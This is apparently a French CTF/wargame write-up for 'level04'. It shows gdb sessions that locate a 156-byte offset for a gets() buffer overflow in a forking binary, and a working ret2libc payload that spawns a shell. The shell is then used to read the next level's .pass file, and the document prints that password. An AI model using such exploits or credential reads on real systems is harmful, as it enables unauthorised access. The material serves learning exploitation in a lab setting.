# LEVEL 04

On trouve un binaire **level04** à la racine du répo, contenant une fonction **main**.

En traduisant le code (**source.c**), on s'appercoit que le main utilise un **gets** que nous pouvons exploiter pour faire un **buffer overflow**.

Petite particularité, il y a la création d'un **child**, que gdb (par défault) ne suit pas. (If PID)

Pour contrer cela nous utlisons la commande <code>set follow-fork-mode child</code>

Ainsi recuperer l'Offset nous faisons donc :
```gdb
(gdb) set follow-fork-mode child

(gdb) b *main+155
Breakpoint 1 at 0x8048763
run
Starting program: /home/users/level04/level04
[New process 2821]
Give me some shellcode, k
BBBBBBBBBBBBBBBBBBBBBBBBBBB
[Switching to process 2821]

Breakpoint 1, 0x08048763 in main ()
(gdb) i f
Stack level 0, frame at 0xffffd720:
 eip = 0x8048763 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args:
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
(gdb) x/30x $eax
0xffffd680:     0x42424242      0x42424242      0x42424242      0x42424242
0xffffd690:     0x42424242      0x42424242      0x00424242      0x00000000
0xffffd6a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6f0:     0x00000000      0x00000000
p 0xffffd71c - 0xffffd680
$1 = 156
```

Donc nous avons un Offset de **156**.

On recupere l'adresse de **system**, **exit** et **/bin/sh**:

```gdb
(gdb) p &system
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) p &exit
$3 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
(gdb) info proc map
process 2821
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fd8000 0xf7fda000     0x2000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Pour finir nous effectuons un Ret2Libc:

```shell
(python -c "print 'A'*156 + '\xd0\xae\xe6\xf7' +  '\x70\xeb\x5e\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```